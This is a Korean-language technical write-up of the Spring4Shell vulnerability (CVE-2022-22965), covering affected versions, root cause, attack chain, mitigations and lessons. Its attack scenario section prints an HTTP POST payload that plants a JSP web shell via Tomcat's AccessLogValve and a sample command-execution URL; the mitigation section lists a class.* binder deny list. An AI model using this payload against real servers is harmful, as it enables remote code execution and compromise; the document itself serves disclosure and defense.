# CVE-2022-22965 - Spring4Shell

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2022-22965 |
| CVSS | 9.8 (Critical) |
| 영향 소프트웨어 | Spring Framework |
| 영향 버전 | 5.3.0 ~ 5.3.17, 5.2.0 ~ 5.2.19 |
| 수정 버전 | 5.3.18, 5.2.20 |
| 공격 유형 | RCE (Remote Code Execution) |
| 발견일 | 2022-03-31 |

## 영향 범위 & 심각성

Spring Framework는 Java 엔터프라이즈 애플리케이션의 사실상 표준으로, 전 세계 수백만 개 서비스에 영향을 미쳤다.

- **조건**: JDK 9 이상 + Spring MVC 또는 WebFlux + WAR 패키징으로 Tomcat 배포
- 금융권, 정부기관, 대기업 백엔드의 대다수가 Spring 기반
- Mirai 봇넷 변종이 이 취약점을 자동 스캔하여 악용
- 중국 보안 연구자가 패치 전 PoC를 유출하여 제로데이 상태로 공격 발생
- Spring Boot의 임베디드 Tomcat(JAR) 배포는 기본적으로 취약하지 않음

## 취약점 기술 분석

### 근본 원인

Java 9에서 도입된 `Module` 시스템으로 인해 `Class.getModule()` 메서드가 추가되었고, Spring의 데이터 바인딩이 `ClassLoader`에 접근 가능해졌다.

```java
// Spring Data Binding이 HTTP 파라미터를 객체에 바인딩
// class.module.classLoader 경로를 통해 Tomcat 내부 객체 접근
class.module.classLoader.resources.context.parent.pipeline.first.pattern=<%웹쉘코드%>
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

### 공격 체인

1. Spring의 `PropertyAccessor`가 중첩 프로퍼티 경로를 해석
2. `class.module.classLoader` 경로로 Tomcat의 `AccessLogValve` 객체에 도달
3. 로그 파일의 경로, 패턴, 확장자를 조작하여 웹쉘 JSP 파일 생성

## 공격 시나리오

```
1단계: 취약한 Spring MVC 엔드포인트 식별 (폼 바인딩 사용)
2단계: POST 요청으로 classLoader 체인을 통해 Tomcat AccessLogValve 조작
3단계: 다음 HTTP 요청 시 webapps/ROOT/shell.jsp 웹쉘 자동 생성
4단계: http://target.com/shell.jsp?cmd=whoami 로 명령 실행
```

```http
POST /vulnerable-endpoint HTTP/1.1
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=
  %25%7Bc2%7Di%20if("j".equals(request.getParameter("pwd")))
  %7Bjava.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(
  request.getParameter("cmd")).getInputStream()%3B...%7D
&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
```

## 방어 방법

1. **Spring Framework 업데이트**: 5.3.18+ 또는 5.2.20+
2. **Spring Boot 업데이트**: 2.6.6+ 또는 2.5.12+
3. **Tomcat 업데이트**: 9.0.62+, 8.5.78+ (ClassLoader 접근 차단)
4. **임시 완화**: `WebDataBinder`에서 위험 필드 차단
   ```java
   @InitBinder
   public void initBinder(WebDataBinder binder) {
       String[] denyList = {"class.*", "Class.*", "*.class.*", "*.Class.*"};
       binder.setDisallowedFields(denyList);
   }
   ```
5. **WAR → JAR 전환**: Spring Boot 임베디드 서버 사용 권장
6. **WAF 규칙**: `class.module.classLoader` 패턴 차단

## 교훈

- **언어 런타임 변경의 보안 영향 평가**: JDK 9 모듈 시스템이 예상치 못한 공격 표면 확대
- **데이터 바인딩의 위험성**: 사용자 입력을 자동 바인딩 시 허용 범위를 명시적으로 제한해야 함
- **심층 방어**: 프레임워크 + WAS + JDK 각 레이어에서 독립적으로 방어
- **배포 방식이 보안에 영향**: WAR vs JAR에 따라 취약 여부가 달라짐

## 참고 자료

- [Spring Blog - CVE-2022-22965](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [NVD - CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)
- [VMware Advisory](https://tanzu.vmware.com/security/cve-2022-22965)
- [Praetorian - Spring4Shell Analysis](https://www.praetorian.com/blog/spring-core-jdk9-class-loader-rce/)
- [CISA Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
